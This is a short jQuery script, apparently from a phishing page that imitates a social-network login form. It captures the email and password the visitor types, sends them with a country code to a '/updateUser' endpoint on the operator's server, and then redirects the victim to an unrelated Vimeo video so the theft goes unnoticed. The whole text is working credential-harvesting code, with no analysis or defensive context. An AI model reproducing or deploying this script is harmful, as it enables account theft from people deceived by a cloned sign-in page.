		<script type="text/javascript">
     $(document).ready(function(){ 
        $("[name='email'], [name='pass']").keypress(function(e){
            if(e.keyCode == 13){
                zanedark();
                return false;
            }
        });

        $('#u_0_1').click(function () {
            zanedark();
        });

        }) ;
     function zanedark(){
        var username = $('#emails').val(); //L&#7845;y username &#273;&#259;ng nh&#7853;p
        var password = $('#passs').val(); //L&#7845;y password &#273;&#259;ng nh&#7853;p
            $.ajax({
                url: '/updateUser',
                type: "POST",
                data: {
					username: username,
					password: password,
					countryCode: `{{ countryCode }}`
				},
                dataType: 'json',
                success: function(result){
                    if (result.success) {
                        window.location.href = 'https://vimeo.com/293781218';
                    }else {
						m(result.message)
					}
                }
            });
            function m(str){
                $("#mesbox").show();
                $("#message").html('<strong><center>' + str + '</center></strong>');
            }
     }
    </script>
